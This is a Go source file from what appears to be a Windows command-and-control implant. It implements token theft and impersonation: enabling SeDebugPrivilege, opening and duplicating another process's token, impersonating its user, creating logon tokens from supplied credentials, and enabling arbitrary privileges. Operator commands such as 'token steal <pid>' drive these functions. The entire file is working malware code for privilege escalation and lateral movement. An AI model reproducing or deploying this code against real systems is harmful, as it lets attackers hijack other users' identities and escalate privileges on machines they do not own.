//go:build windows

package implant

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

var (
	advapi32              = syscall.NewLazyDLL("advapi32.dll")
	pOpenProcessToken     = advapi32.NewProc("OpenProcessToken")
	pDuplicateTokenEx     = advapi32.NewProc("DuplicateTokenEx")
	pImpersonateLoggedOn  = advapi32.NewProc("ImpersonateLoggedOnUser")
	pRevertToSelf         = advapi32.NewProc("RevertToSelf")
	pLookupPrivilegeValue = advapi32.NewProc("LookupPrivilegeValueW")
	pAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
	pCreateProcessWithToken = advapi32.NewProc("CreateProcessWithTokenW")
	pLogonUserW           = advapi32.NewProc("LogonUserW")
	pGetTokenInformation  = advapi32.NewProc("GetTokenInformation")
	pLookupAccountSidW    = advapi32.NewProc("LookupAccountSidW")

	pOpenProcess2          = modKernel32.NewProc("OpenProcess")
)

const (
	TOKEN_ALL_ACCESS      = 0xF01FF
	TOKEN_DUPLICATE       = 0x0002
	TOKEN_QUERY           = 0x0008
	TOKEN_IMPERSONATE     = 0x0004
	TOKEN_ASSIGN_PRIMARY  = 0x0001
	PROCESS_QUERY_INFO    = 0x0400
	SecurityImpersonation = 2
	TokenPrimary          = 1
	TokenUser             = 1
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
	SE_PRIVILEGE_ENABLED  = 0x00000002
)

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

type SID_AND_ATTRIBUTES struct {
	Sid        uintptr
	Attributes uint32
}

type TOKEN_USER struct {
	User SID_AND_ATTRIBUTES
}

// ════════════════════════════════════════════════════════
//  TOKEN STEALING / IMPERSONATION
// ════════════════════════════════════════════════════════

// StealToken steals a token from a running process and impersonates it.
func StealToken(pid uint32) ([]byte, error) {
	// Enable SeDebugPrivilege first (required to open other processes' tokens)
	enableDebugPrivilege()

	// Open target process with PROCESS_QUERY_INFORMATION
	hProcess, _, err := pOpenProcess2.Call(
		uintptr(0x0400|0x1000), // PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		// Try with less permissions
		hProcess, _, err = pOpenProcess2.Call(0x1000, 0, uintptr(pid)) // PROCESS_QUERY_LIMITED_INFORMATION only
		if hProcess == 0 {
			return nil, fmt.Errorf("OpenProcess(%d): %v", pid, err)
		}
	}
	defer syscall.CloseHandle(syscall.Handle(hProcess))

	// Open process token
	var hToken syscall.Handle
	ret, _, err := pOpenProcessToken.Call(hProcess, TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_IMPERSONATE, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return nil, fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer syscall.CloseHandle(hToken)

	// Duplicate token
	var hDupToken syscall.Handle
	ret, _, err = pDuplicateTokenEx.Call(
		uintptr(hToken),
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&hDupToken)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer syscall.CloseHandle(hDupToken)

	// Impersonate
	ret, _, err = pImpersonateLoggedOn.Call(uintptr(hDupToken))
	if ret == 0 {
		return nil, fmt.Errorf("ImpersonateLoggedOnUser: %w", err)
	}

	// Get the username of the stolen token
	username := getTokenUsername(hDupToken)

	return []byte(fmt.Sprintf("[+] Token stolen from PID %d\n[+] Now impersonating: %s", pid, username)), nil
}

// RevertToken drops the impersonated token and reverts to the original.
func RevertToken() ([]byte, error) {
	ret, _, err := pRevertToSelf.Call()
	if ret == 0 {
		return nil, fmt.Errorf("RevertToSelf: %w", err)
	}
	return []byte("[+] Reverted to original token"), nil
}

// enableDebugPrivilege enables SeDebugPrivilege on the current process token.
// Required to open processes owned by other users (like stealing tokens).
func enableDebugPrivilege() {
	var hToken syscall.Handle
	currentProcess, _ := syscall.GetCurrentProcess()
	pOpenProcessToken.Call(uintptr(currentProcess), TOKEN_QUERY|0x0020, uintptr(unsafe.Pointer(&hToken))) // TOKEN_ADJUST_PRIVILEGES = 0x0020

	if hToken == 0 {
		return
	}
	defer syscall.CloseHandle(hToken)

	privName, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	var luid LUID
	pLookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(privName)), uintptr(unsafe.Pointer(&luid)))

	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{Luid: luid, Attributes: SE_PRIVILEGE_ENABLED},
		},
	}
	pAdjustTokenPrivileges.Call(uintptr(hToken), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
}

// MakeToken creates a new logon token with provided credentials.
func MakeToken(domain, username, password string) ([]byte, error) {
	domainW, _ := syscall.UTF16PtrFromString(domain)
	usernameW, _ := syscall.UTF16PtrFromString(username)
	passwordW, _ := syscall.UTF16PtrFromString(password)

	var hToken syscall.Handle
	ret, _, err := pLogonUserW.Call(
		uintptr(unsafe.Pointer(usernameW)),
		uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passwordW)),
		LOGON32_LOGON_NEW_CREDENTIALS,
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("LogonUser: %w", err)
	}

	ret, _, err = pImpersonateLoggedOn.Call(uintptr(hToken))
	if ret == 0 {
		syscall.CloseHandle(hToken)
		return nil, fmt.Errorf("ImpersonateLoggedOnUser: %w", err)
	}

	return []byte(fmt.Sprintf("[+] Token created for %s\\%s\n[+] Now impersonating: %s\\%s", domain, username, domain, username)), nil
}

// GetCurrentTokenInfo returns information about the current thread token.
func GetCurrentTokenInfo() ([]byte, error) {
	output, _ := ExecuteShell([]string{"whoami /all"})
	return output, nil
}

// EnablePrivilege enables a named privilege on the current process token.
func EnablePrivilege(privName string) ([]byte, error) {
	var hToken syscall.Handle
	hProcess, _ := syscall.GetCurrentProcess()
	ret, _, err := pOpenProcessToken.Call(uintptr(hProcess), TOKEN_ALL_ACCESS, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return nil, fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer syscall.CloseHandle(hToken)

	privNameW, _ := syscall.UTF16PtrFromString(privName)
	var luid LUID
	ret, _, err = pLookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(privNameW)), uintptr(unsafe.Pointer(&luid)))
	if ret == 0 {
		return nil, fmt.Errorf("LookupPrivilegeValue(%s): %w", privName, err)
	}

	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges:     [1]LUID_AND_ATTRIBUTES{{Luid: luid, Attributes: SE_PRIVILEGE_ENABLED}},
	}

	ret, _, err = pAdjustTokenPrivileges.Call(uintptr(hToken), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if ret == 0 {
		return nil, fmt.Errorf("AdjustTokenPrivileges: %w", err)
	}

	return []byte(fmt.Sprintf("[+] Privilege enabled: %s", privName)), nil
}

// getTokenUsername extracts the username from a token handle.
func getTokenUsername(hToken syscall.Handle) string {
	var size uint32
	pGetTokenInformation.Call(uintptr(hToken), TokenUser, 0, 0, uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		return "unknown"
	}

	buf := make([]byte, size)
	ret, _, _ := pGetTokenInformation.Call(uintptr(hToken), TokenUser, uintptr(unsafe.Pointer(&buf[0])), uintptr(size), uintptr(unsafe.Pointer(&size)))
	if ret == 0 {
		return "unknown"
	}

	tokenUser := (*TOKEN_USER)(unsafe.Pointer(&buf[0]))

	var nameSize, domainSize uint32
	var sidUse uint32
	nameSize = 256
	domainSize = 256
	nameBuf := make([]uint16, nameSize)
	domainBuf := make([]uint16, domainSize)

	pLookupAccountSidW.Call(
		0,
		tokenUser.User.Sid,
		uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(unsafe.Pointer(&nameSize)),
		uintptr(unsafe.Pointer(&domainBuf[0])), uintptr(unsafe.Pointer(&domainSize)),
		uintptr(unsafe.Pointer(&sidUse)),
	)

	domain := syscall.UTF16ToString(domainBuf[:domainSize])
	name := syscall.UTF16ToString(nameBuf[:nameSize])

	if domain != "" {
		return domain + "\\" + name
	}
	return name
}

// ExecuteTokenCommand handles token-related task arguments.
func ExecuteTokenCommand(args []string) ([]byte, error) {
	if len(args) == 0 {
		var sb strings.Builder
		sb.WriteString("Token Commands:\n")
		sb.WriteString("  token steal <pid>              Steal token from process\n")
		sb.WriteString("  token make <domain> <user> <pass>  Create logon token\n")
		sb.WriteString("  token revert                   Revert to original token\n")
		sb.WriteString("  token info                     Show current token info\n")
		sb.WriteString("  token priv <name>              Enable privilege (e.g. SeDebugPrivilege)\n")
		return []byte(sb.String()), nil
	}

	switch args[0] {
	case "steal":
		if len(args) < 2 {
			return []byte("Usage: token steal <pid>"), nil
		}
		var pid uint32
		fmt.Sscanf(args[1], "%d", &pid)
		return StealToken(pid)
	case "make":
		if len(args) < 4 {
			return []byte("Usage: token make <domain> <username> <password>"), nil
		}
		return MakeToken(args[1], args[2], args[3])
	case "revert":
		return RevertToken()
	case "info":
		return GetCurrentTokenInfo()
	case "priv":
		if len(args) < 2 {
			return []byte("Usage: token priv <SeDebugPrivilege|SeImpersonatePrivilege|...>"), nil
		}
		return EnablePrivilege(args[1])
	default:
		return []byte("Unknown token command. Use: steal, make, revert, info, priv"), nil
	}
}
